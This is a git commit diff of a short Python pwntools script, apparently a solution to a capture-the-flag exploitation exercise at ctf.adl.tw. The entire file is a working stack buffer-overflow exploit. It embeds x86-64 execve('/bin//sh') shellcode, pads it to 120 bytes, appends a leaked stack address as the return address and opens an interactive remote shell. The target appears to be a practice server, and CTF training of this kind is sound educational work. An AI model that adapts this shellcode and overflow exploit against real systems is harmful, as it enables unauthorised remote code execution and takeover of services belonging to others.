5fdccbe33530e79468d2bdc61744099cc123c330
wuling31715 <wuling31715@gmail.com>
2020-04-14 23:17:09 +0800

    .

--- adl/example/main.py
+++ adl/example/main.py
@@ -1,24 +1,18 @@
 from pwn import *
-import struct
-
-# print(cyclic(1000))
 
 ip = 'ctf.adl.tw'
 port = 11000
 r = remote(ip, port)
 
 shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
+shellcode += "a" * (120 - len(shellcode))
 
-payload = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab"
-# payload += p64(0x0)
-# address = r.recv()
-# print("address: " + address)
-# payload += p64(address)
-# payload += p64(int(address.decode(),16))
-# print(payload)
+address = r.recv()
+print("address: " + address)
 
-payload += shellcode
+shellcode += p64(int(address.decode(),16))
+print(shellcode)
 
-r.sendline(payload)
+r.send(shellcode)
 r.interactive()
 
